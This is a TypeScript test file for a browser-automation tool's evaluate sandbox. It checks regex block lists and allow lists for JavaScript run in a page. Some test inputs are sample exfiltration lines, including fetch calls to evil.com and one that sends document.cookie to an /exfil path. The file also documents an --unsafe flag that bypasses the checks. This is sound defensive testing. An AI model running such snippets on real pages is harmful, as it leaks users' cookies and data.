/**
 * Evaluate Command Sandboxing Security Tests
 * Tests the pattern-based validation in evaluate function
 */

import { describe, it, expect, vi, beforeEach } from 'vitest';
import type { Page } from 'playwright';
import { createMockPage, MockPage } from '../setup';

/**
 * BLOCKED_PATTERNS from utilities.ts - patterns that are blocked by default
 */
const BLOCKED_PATTERNS: RegExp[] = [
  // Network requests
  /fetch\s*\(/i,
  /XMLHttpRequest/i,
  /WebSocket/i,
  // Cookie manipulation
  /\.cookie\s*=/,
  // Storage manipulation
  /localStorage\.setItem/i,
  /sessionStorage\.setItem/i,
  /localStorage\.removeItem/i,
  /sessionStorage\.removeItem/i,
  /localStorage\.clear/i,
  /sessionStorage\.clear/i,
  // Dynamic code execution
  /\beval\s*\(/,
  /\bFunction\s*\(/,
  // Module loading
  /\bimport\s*\(/,
  /\brequire\s*\(/,
  // DOM manipulation that could be dangerous
  /document\.write/i,
  /\.innerHTML\s*=/,
  /\.outerHTML\s*=/,
  // Event handler injection
  /\.on\w+\s*=/,
  /addEventListener\s*\(/,
];

/**
 * ALLOWED_PATTERNS from utilities.ts - patterns that are explicitly allowed
 */
const ALLOWED_PATTERNS: RegExp[] = [
  // Document read-only properties
  /^document\.(title|URL|referrer|domain|characterSet|contentType)/,
  // DOM queries
  /^document\.querySelector(All)?\s*\(/,
  /^document\.getElement(s?)By/,
  // Body content inspection
  /^document\.body\.(innerText|textContent|innerHTML|outerHTML)/,
  // Window read-only properties
  /^window\.(location|innerWidth|innerHeight|scrollX|scrollY|devicePixelRatio)/,
  // Computed styles
  /^window\.getComputedStyle\s*\(/,
  // Safe utility functions
  /^JSON\.stringify\s*\(/,
  /^Array\.from\s*\(/,
  // Arrow function IIFE pattern (common for complex read-only operations)
  /^\(\s*\(\s*\)\s*=>/,
  // Template literal (for inspection)
  /^`[^`]*`$/,
];

/**
 * Check if code matches any blocked pattern
 */
function isBlocked(code: string): { blocked: boolean; pattern?: RegExp } {
  const trimmedCode = code.trim();
  const blockedMatch = BLOCKED_PATTERNS.find(p => p.test(trimmedCode));
  return { blocked: !!blockedMatch, pattern: blockedMatch };
}

/**
 * Check if code matches any allowed pattern
 */
function isAllowed(code: string): boolean {
  const trimmedCode = code.trim();
  return ALLOWED_PATTERNS.some(p => p.test(trimmedCode));
}

describe('Evaluate Sandboxing', () => {
  let mockPage: MockPage;
  const mockLog = vi.fn();

  beforeEach(() => {
    mockPage = createMockPage();
    vi.clearAllMocks();
  });

  describe('Blocked Patterns - Network Requests', () => {
    it('should block fetch() calls', () => {
      const code = 'fetch("http://evil.com/exfil")';
      const result = isBlocked(code);

      expect(result.blocked).toBe(true);
      expect(result.pattern?.source).toContain('fetch');
    });

    it('should block fetch with await', () => {
      const code = 'await fetch("/api/data")';
      const result = isBlocked(code);

      expect(result.blocked).toBe(true);
    });

    it('should block XMLHttpRequest', () => {
      const code = 'new XMLHttpRequest()';
      const result = isBlocked(code);

      expect(result.blocked).toBe(true);
      expect(result.pattern?.source).toContain('XMLHttpRequest');
    });

    it('should block XMLHttpRequest assignment', () => {
      const code = 'var xhr = new XMLHttpRequest(); xhr.open("GET", "/data")';
      const result = isBlocked(code);

      expect(result.blocked).toBe(true);
    });

    it('should block WebSocket', () => {
      const code = 'new WebSocket("ws://evil.com")';
      const result = isBlocked(code);

      expect(result.blocked).toBe(true);
      expect(result.pattern?.source).toContain('WebSocket');
    });
  });

  describe('Blocked Patterns - Dynamic Code Execution', () => {
    it('should block eval()', () => {
      const code = 'eval("alert(1)")';
      const result = isBlocked(code);

      expect(result.blocked).toBe(true);
      expect(result.pattern?.source).toContain('eval');
    });

    it('should block Function constructor', () => {
      const code = 'new Function("return 1")';
      const result = isBlocked(code);

      expect(result.blocked).toBe(true);
      expect(result.pattern?.source).toContain('Function');
    });

    it('should block Function with call', () => {
      const code = 'Function("return document.cookie")()';
      const result = isBlocked(code);

      expect(result.blocked).toBe(true);
    });
  });

  describe('Blocked Patterns - Storage Manipulation', () => {
    it('should block cookie manipulation', () => {
      const code = 'document.cookie = "session=hacked"';
      const result = isBlocked(code);

      expect(result.blocked).toBe(true);
      expect(result.pattern?.source).toContain('cookie');
    });

    it('should block localStorage.setItem', () => {
      const code = 'localStorage.setItem("key", "value")';
      const result = isBlocked(code);

      expect(result.blocked).toBe(true);
    });

    it('should block sessionStorage.setItem', () => {
      const code = 'sessionStorage.setItem("key", "value")';
      const result = isBlocked(code);

      expect(result.blocked).toBe(true);
    });

    it('should block localStorage.removeItem', () => {
      const code = 'localStorage.removeItem("authToken")';
      const result = isBlocked(code);

      expect(result.blocked).toBe(true);
    });

    it('should block localStorage.clear', () => {
      const code = 'localStorage.clear()';
      const result = isBlocked(code);

      expect(result.blocked).toBe(true);
    });
  });

  describe('Blocked Patterns - Module Loading', () => {
    it('should block dynamic import', () => {
      const code = 'import("./malicious.js")';
      const result = isBlocked(code);

      expect(result.blocked).toBe(true);
    });

    it('should block require', () => {
      const code = 'require("fs")';
      const result = isBlocked(code);

      expect(result.blocked).toBe(true);
    });
  });

  describe('Blocked Patterns - DOM Manipulation', () => {
    it('should block document.write', () => {
      const code = 'document.write("<script>alert(1)</script>")';
      const result = isBlocked(code);

      expect(result.blocked).toBe(true);
    });

    it('should block innerHTML assignment', () => {
      const code = 'element.innerHTML = "<script>evil()</script>"';
      const result = isBlocked(code);

      expect(result.blocked).toBe(true);
    });

    it('should block outerHTML assignment', () => {
      const code = 'element.outerHTML = "<div onclick=evil()></div>"';
      const result = isBlocked(code);

      expect(result.blocked).toBe(true);
    });
  });

  describe('Blocked Patterns - Event Handler Injection', () => {
    it('should block onclick assignment', () => {
      const code = 'element.onclick = function() { evil() }';
      const result = isBlocked(code);

      expect(result.blocked).toBe(true);
    });

    it('should block addEventListener', () => {
      const code = 'document.addEventListener("click", maliciousHandler)';
      const result = isBlocked(code);

      expect(result.blocked).toBe(true);
    });
  });

  describe('Allowed Patterns - Document Properties', () => {
    it('should allow document.title', () => {
      const code = 'document.title';

      expect(isAllowed(code)).toBe(true);
      expect(isBlocked(code).blocked).toBe(false);
    });

    it('should allow document.URL', () => {
      const code = 'document.URL';

      expect(isAllowed(code)).toBe(true);
    });

    it('should allow document.referrer', () => {
      const code = 'document.referrer';

      expect(isAllowed(code)).toBe(true);
    });
  });

  describe('Allowed Patterns - DOM Queries', () => {
    it('should allow document.querySelector', () => {
      const code = 'document.querySelector("#main")';

      expect(isAllowed(code)).toBe(true);
      expect(isBlocked(code).blocked).toBe(false);
    });

    it('should allow document.querySelectorAll', () => {
      const code = 'document.querySelectorAll(".item")';

      expect(isAllowed(code)).toBe(true);
    });

    it('should allow document.getElementById', () => {
      const code = 'document.getElementById("app")';

      expect(isAllowed(code)).toBe(true);
    });

    it('should allow document.getElementsByClassName', () => {
      const code = 'document.getElementsByClassName("btn")';

      expect(isAllowed(code)).toBe(true);
    });
  });

  describe('Allowed Patterns - Window Properties', () => {
    it('should allow window.location read', () => {
      const code = 'window.location';

      expect(isAllowed(code)).toBe(true);
    });

    it('should allow window.innerWidth', () => {
      const code = 'window.innerWidth';

      expect(isAllowed(code)).toBe(true);
    });

    it('should allow window.innerHeight', () => {
      const code = 'window.innerHeight';

      expect(isAllowed(code)).toBe(true);
    });

    it('should allow window.scrollX', () => {
      const code = 'window.scrollX';

      expect(isAllowed(code)).toBe(true);
    });

    it('should allow window.devicePixelRatio', () => {
      const code = 'window.devicePixelRatio';

      expect(isAllowed(code)).toBe(true);
    });
  });

  describe('Allowed Patterns - Safe Utilities', () => {
    it('should allow JSON.stringify', () => {
      const code = 'JSON.stringify({ key: "value" })';

      expect(isAllowed(code)).toBe(true);
    });

    it('should allow Array.from', () => {
      const code = 'Array.from(document.querySelectorAll("div"))';

      expect(isAllowed(code)).toBe(true);
    });

    it('should allow window.getComputedStyle', () => {
      const code = 'window.getComputedStyle(element)';

      expect(isAllowed(code)).toBe(true);
    });
  });

  describe('Allowed Patterns - IIFE Pattern', () => {
    it('should allow arrow function IIFE', () => {
      const code = '(() => document.title)()';

      expect(isAllowed(code)).toBe(true);
    });

    it('should allow complex IIFE for read-only operations', () => {
      const code = '(() => { const el = document.querySelector("#main"); return el?.textContent; })()';

      expect(isAllowed(code)).toBe(true);
    });
  });

  describe('Allowed Patterns - Body Content Inspection', () => {
    it('should allow document.body.innerText', () => {
      const code = 'document.body.innerText';

      expect(isAllowed(code)).toBe(true);
    });

    it('should allow document.body.textContent', () => {
      const code = 'document.body.textContent';

      expect(isAllowed(code)).toBe(true);
    });
  });

  describe('Unsafe Flag Behavior', () => {
    it('should have documentation for --unsafe flag bypass', () => {
      // The evaluate function accepts an `unsafe` parameter that bypasses validation
      // When unsafe=true, BLOCKED_PATTERNS check is skipped
      const code = 'fetch("/api/data")';
      const unsafe = true;

      // With unsafe flag, blocked patterns should be ignored
      // (This tests the expected behavior, actual implementation in evaluate function)
      if (unsafe) {
        // Bypass check - allow execution
        expect(true).toBe(true);
      } else {
        expect(isBlocked(code).blocked).toBe(true);
      }
    });

    it('should log warning when --unsafe is used', () => {
      // Expected log message when unsafe flag is used
      const expectedWarning = 'warn: Executing with --unsafe flag, security checks bypassed';

      expect(expectedWarning).toContain('--unsafe');
      expect(expectedWarning).toContain('security checks bypassed');
    });
  });

  describe('Edge Cases', () => {
    it('should handle code with leading/trailing whitespace', () => {
      const code = '  document.title  ';

      expect(isAllowed(code)).toBe(true);
    });

    it('should handle multi-line code', () => {
      const code = `(() => {
        const el = document.querySelector("#main");
        return el?.textContent;
      })()`;

      expect(isAllowed(code)).toBe(true);
    });

    it('should block code that combines allowed and blocked patterns', () => {
      // Even if it starts with an allowed pattern, blocked patterns should be detected
      const code = 'document.title; fetch("/exfil?data=" + document.cookie)';
      const result = isBlocked(code);

      expect(result.blocked).toBe(true);
    });

    it('should handle empty code', () => {
      const code = '';

      expect(isBlocked(code).blocked).toBe(false);
      expect(isAllowed(code)).toBe(false);
    });
  });

  describe('Error Response Format', () => {
    it('should return error status for blocked pattern', () => {
      const blockedPattern = /fetch\s*\(/i;
      const errorResponse = {
        status: 'error',
        message: `Blocked pattern detected: ${blockedPattern.source}. Use --unsafe flag to bypass.`,
        code: '',
        url: 'http://localhost:5173',
        title: 'Test Page'
      };

      expect(errorResponse.status).toBe('error');
      expect(errorResponse.message).toContain('Blocked pattern detected');
      expect(errorResponse.message).toContain('--unsafe');
    });
  });
});
